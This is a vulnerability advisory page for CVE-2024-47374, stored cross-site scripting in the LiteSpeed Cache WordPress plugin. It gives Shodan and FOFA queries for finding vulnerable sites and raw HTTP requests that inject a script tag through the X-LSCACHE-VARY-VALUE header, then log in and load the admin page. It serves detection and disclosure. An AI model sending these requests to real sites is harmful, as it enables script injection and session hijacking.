---
layout: "post"
cve_id: "CVE-2024-47374"
title: "LiteSpeed Cache <= 6.5.0.2 - Stored XSS"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-47374.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-47374.yaml"
author: "Sourabh-Sahu"
severity: "high"
impact: "Attackers can execute malicious scripts in victim browsers, leading to session hijacking, defacement, or redirection.
"
remediation: "Update to the latest version of LiteSpeed Cache.
"
reference:
  - "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/litespeed-cache/litespeed-cache-61-unauthenticated-stored-cross-site-scripting"
  - "https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-5-0-2-cross-site-scripting-xss-vulnerability?_s_id=cve"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L', 'cvss-score': 7.1, 'cve-id': 'CVE-2024-47374', 'cwe-id': 'CWE-79', 'epss-score': 0.19283, 'epss-percentile': 0.9516, 'cpe': 'cpe:2.3:a:litespeedtech:litespeed_cache:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'fofa-query': 'body=/wp-content/plugins/litespeed-cache/', 'google-query': 'inurl:"/wp-content/plugins/litespeed-cache/"', 'shodan-query': 'http.html:"/wp-content/plugins/litespeed-cache/"'}"
tags:
  - "cve"
  - "cve2024"
  - "wordpress"
  - "wp-plugin"
  - "xss"
  - "stored"
  - "litespeed"
  - "authenticated"
  - "vkev"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
LiteSpeed Technologies LiteSpeed Cache versions up to 6.5.0.2 contain a stored cross-site scripting caused by improper input neutralization during web page generation, letting attackers execute malicious scripts in victim browsers, exploit requires storing malicious input.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: close
X-LSCACHE-VARY-VALUE: "><script>alert(1)</script>
Accept-Encoding: gzip
```

```nohighlight
GET /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Connection: close
Content-Length: 75
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Accept-Encoding: gzip

log=raDVSG&pwd=5eln2D&wp-submit=Log+In&redirect_to=//wp-admin/&testcookie=1
```

```nohighlight
GET /wp-admin/admin.php?page=litespeed-page_optm HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Connection: close
Accept-Encoding: gzip
```

